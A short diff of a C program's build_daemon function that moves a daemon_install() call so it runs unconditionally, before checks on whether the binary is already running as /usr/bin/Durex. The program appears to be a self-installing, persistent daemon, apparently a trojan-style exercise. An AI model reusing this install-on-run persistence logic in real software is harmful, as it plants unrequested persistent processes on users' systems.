@@ -69,11 +69,11 @@ int		build_daemon(int argc, char **argv)
 	}
 	if (silence == false)
 		printf("%s\n", get_login());
+	daemon_install();
 	if (build_status() == 1)
 		return (0);
 	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
 	{
-		daemon_install();
 		return (start_daemon(argc, argv));
 	}
 	return (durex_daemon(argv[0]));
